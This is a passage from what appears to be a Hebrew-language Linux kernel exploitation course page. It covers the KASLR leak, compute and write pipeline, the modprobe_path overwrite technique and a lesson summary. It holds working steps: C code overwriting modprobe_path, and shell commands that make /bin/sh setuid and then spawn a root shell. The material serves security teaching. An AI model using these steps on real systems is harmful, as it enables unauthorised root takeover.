+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>step 1 - leak:    read a known kernel structure and extract an address
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>                   -&gt; compute the kernel base -&gt; defeat KASLR
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>step 2 - compute: base + known offset = address of commit_creds,
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>                   of modprobe_path, of the function we want to overwrite
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>step 3 - control: write to the computed address -&gt; escalate to root
+</code></pre></div>
+<p>בשלב השלישי, כשיש כתיבה שרירותית אבל ההגנות SMEP/SMAP/KPTI דולקות ומקשות על קפיצה לקוד שלנו, הטריק הכי אלגנטי הוא דריסת המשתנה <code>modprobe_path</code>. זהו מחרוזת גלובלית בkernel שמכילה את הנתיב <code>"/sbin/modprobe"</code>. כשהkernel מנסה להריץ קובץ עם פורמט שהוא לא מזהה, הוא קורא ל-<code>call_usermodehelper</code> עם הנתיב הזה - וכ-root. אז אנחנו:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1">// 1. overwrite modprobe_path with a path to our script</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">new_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/tmp/x&quot;</span><span class="p">;</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">new_path</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">    </span><span class="n">kwrite64</span><span class="p">(</span><span class="n">modprobe_path_addr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">new_path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">));</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># 2. prepare a malicious script and an unrecognized executable named /tmp/x and /tmp/dummy</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;#!/bin/sh\nchmod u+s /bin/sh&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/x
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/x
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;\xff\xff\xff\xff&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/dummy<span class="w">   </span><span class="c1"># a file with an unrecognized magic number</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/dummy
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="c1"># 3. run /tmp/dummy. the kernel doesn&#39;t recognize the format,</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="c1">#    calls /tmp/x as root, and that turns /bin/sh into setuid</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>/tmp/dummy
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>/bin/sh<span class="w"> </span>-p<span class="w">    </span><span class="c1"># and now we&#39;re root</span>
+</code></pre></div>
+<p>היופי בטכניקה הזו הוא שהיא נתונים בלבד. היא לא קופצת לשום קוד שלנו, לא מריצה shellcode ולא בונה ROP chain, ולכן SMEP ו-SMAP לא רלוונטיים בכלל. כתיבה שרירותית אחת של כמה בתים, וזהו. בשיעורים הבאים נראה גם את הדרך השנייה - קריאה מבוקרת ל-<code>commit_creds(prepare_kernel_cred(0))</code> דרך ROP chain בתוך הkernel - וגם איך מפילים את KASLR כשהיא דלוקה באמת.</p>
+<hr />
+<h2 id="_1">סיכום<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li>הkernel רץ ב-ring 0 עם הרשאות מלאות ובלי בידוד פנימי - באג בכל דרייבר שווה שליטה על כל המערכת.</li>
+<li>גבול ה-syscall הוא נקודת הכניסה שלנו, וקונבנציית הרגיסטרים שם (<code>rax</code> למספר, <code>rdi/rsi/rdx/r10/r8/r9</code> לארגומנטים) חשובה לזכור.</li>
+<li>רוב החולשות חיות במודולים נטענים - loadable kernel modules - ובמנהלי התקן תווים, במיוחד ב-handlers של <code>ioctl</code>.</li>
+<li>משטח התקיפה: קריאות מערכת, מטפלי ioctl ומנהלי התקן. מחפשים את הקוד שהכי הרבה קלט לא מהימן עובר בו.</li>
+<li>המטרה כמעט תמיד היא הסלמה ל-root, בדרך כלל דרך <code>commit_creds(prepare_kernel_cred(0))</code> או דריסת <code>modprobe_path</code>.</li>
+<li>ההגנות בkernel: KASLR, SMEP, SMAP, KPTI, canary על המחסנית, ולצידן kptr_restrict ו-dmesg_restrict שמצמצמות leaks. אף אחת לא עומדת לבד.</li>
+<li>כל מחקר kernel נעשה בתוך מכונת QEMU עם bzImage, initramfs ומודול vulnerable, כשאפשר לחבר GDB דרך <code>-s</code>.</li>
+<li>שני הפרימיטיבים שאנחנו רודפים אחריהם הם קריאה שרירותית וכתיבה שרירותית. עם שניהם, ה-pipeline הוא leak -&gt; חישוב מול בסיס הkernel -&gt; כתיבה -&gt; root.</li>
+</ul>
+<p>בשיעור הבא (9.2) ניקח את הידע הזה למעשה: נכתוב syscall מותאם vulnerable, ננצל אותו עם טכניקת ret2usr, ונתמודד לראשונה עם SMEP.</p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="עדכון אחרון">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime" title="15 ביולי 2026 19:14:25 UTC">2026-07-15 19:14:25</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  חזרה למעלה
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.tabs", "navigation.indexes", "navigation.top", "navigation.prune", "navigation.path", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u05d4\u05d5\u05e2\u05ea\u05e7 \u05dc\u05dc\u05d5\u05d7", "clipboard.copy": "\u05d4\u05e2\u05ea\u05e7\u05d4 \u05dc\u05dc\u05d5\u05d7", "search.result.more.one": "\u05e2\u05d5\u05d3 \u05d0\u05d7\u05d3 \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.more.other": "\u05e2\u05d5\u05d3 # \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.none": "\u05d0\u05d9\u05df \u05de\u05e1\u05de\u05db\u05d9\u05dd \u05ea\u05d5\u05d0\u05de\u05d9\u05dd", "search.result.one": "\u05de\u05e1\u05de\u05da1 \u05ea\u05d5\u05d0\u05dd", "search.result.other": "# \u05de\u05e1\u05de\u05da \u05ea\u05d5\u05d0\u05dd", "search.result.placeholder": "\u05d9\u05e9 \u05dc\u05d4\u05e7\u05dc\u05d9\u05d3 \u05db\u05d3\u05d9 \u05dc\u05d4\u05ea\u05d7\u05d9\u05dc \u05dc\u05d7\u05e4\u05e9", "search.result.term.missing": "\u05d7\u05e1\u05e8", "select.version": "\u05d1\u05d7\u05d9\u05e8\u05ea \u05d2\u05e8\u05e1\u05d4"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../javascripts/progress.js"></script>
+      
+        <script src="../../../../javascripts/tabs-dropdown.js"></script>
+      
+        <script src="../../../../javascripts/theme-switcher.js"></script>
+      
+        <script src="../../../../javascripts/recent-posts.js"></script>
+      
+    
+  </body>
+</html>
